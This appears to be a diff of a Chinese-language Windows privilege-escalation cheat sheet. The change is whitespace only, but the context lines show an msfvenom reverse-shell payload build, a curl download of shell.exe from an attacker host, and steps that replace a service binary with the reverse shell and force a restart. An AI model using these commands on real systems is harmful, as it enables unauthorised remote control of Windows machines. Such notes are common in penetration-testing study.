@@ -447,6 +447,7 @@ iscacls E:\mysql\bin\mysql.exe
 # W - 只写
 # 3D - 删除
 ```
+
 ```bash
 那么如何提权
 1. msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
@@ -458,6 +459,7 @@ iscacls E:\mysql\bin\mysql.exe
 # 这里需要你有可以停止和启动的权限(server operators)
 # vss是默认包含服务，这里的vss就是你有权限停止或开始的项目
 ```
+
 ```bash
 # 如果有权利shutdown，那么可以将此exe文件替换成反弹shell文件，最后shutdown -r
 rename bd.exe bd.exe.bak
@@ -466,7 +468,6 @@ curl http://ip:port/shell.exe -o bd.exe
 copy C:\xampp\htdocs\reverse.exe bd.exe
 shutdown -r -t 0
 ```
-
 
 6. 后续可以修改文件，如果有重启权限就重启，大多数情况下没有，但都有开机重启，这个时候我们重新开机即可。
 
